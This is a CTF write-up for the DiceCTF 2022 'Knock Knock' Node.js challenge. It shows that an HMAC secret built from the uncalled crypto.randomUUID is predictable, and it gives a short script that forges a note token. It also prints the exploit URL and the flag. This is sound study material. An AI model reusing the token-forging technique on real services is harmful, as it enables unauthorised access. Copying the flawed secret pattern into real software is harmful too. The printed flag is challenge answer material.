# Knock Knock

# Background
This chall is strange and really cool also and make me to learn node js from basic back.


# Vuln detect
So, there is two mistake in source code if you look carefully.

1. In below, you can see the `this.secret` object will craete a hash with `randomUUID`. but this will just return a `undefined` [Example file](https://github.com/Vimer101/private-ctf-solves/blob/main/Dice-CTF-2022/Knock-Knock/example.js). 
  **don't ask me why because i am noob at js**
```
class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }
```
2. as a below source, we can know that Developer generate a `token` value with a `id`, also create the hash with `this.secret` object too: 
  `createHmac('sha256', this.secret`. And the most scary part is that know the secret's value :). it is `secret-${crypto.randomUUID}`!!.
```
generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret) // here is main vuln
      .update(id.toString()) 
      .digest('hex');
  }
}
```

So, we know the vuln now, what need to do? and also how we can get flag? answer is in below!!

# Solution
So first, we know the secret value!.

and this line make us to get easier `else res.send(note.data);`. by this line, we can know that if we pass `note.error`, we will get the data that return.
 and there is only data to return in database is FLAG!!!!!!!!!.
 
 So, why not create our own hash for token?. let create!!
 
 # Solve.js
 ```
const crypto = require('crypto');
secret = `secret-${crypto.randomUUID}`;

console.log(`${crypto.createHmac('sha256', secret).update('0').digest('hex')}`);
 ```
this output this hash `7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264`. 

**Note**: the hash will be diffrent dude to node version. i used node version `17.4.0`. you have to be same or at least not too outdate with the challenge's server node version.

# get flag
https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
`dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}`

# To CTF orgraziners
Thanks for really awesome Web challenges and other challs too.

Thanks for reading all!!
